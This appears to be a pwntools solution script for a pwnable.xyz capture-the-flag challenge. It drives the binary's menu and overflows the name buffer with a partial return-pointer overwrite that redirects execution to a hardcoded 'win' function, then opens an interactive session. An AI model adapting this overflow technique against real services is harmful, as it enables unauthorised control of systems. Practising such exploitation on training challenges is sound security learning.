from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/challenge')
else:
    r = remote('svc.pwnable.xyz', 30009)

sla = r.sendlineafter
sa = r.sendafter

def play_game(answer=None):
    sla('> ', '1')
    if answer is not None:
        sla('= ', str(answer))

def save_game():
    sla('> ', '2')

def edit_name(name):
    sla('> ', '3')
    r.send(name)

win = 0x4009d6

sa('Name: ', 'a' * 16)

play_game(0)
save_game()
edit_name(b'a' * 0x18 + p64(win)[:3])
play_game()

r.interactive()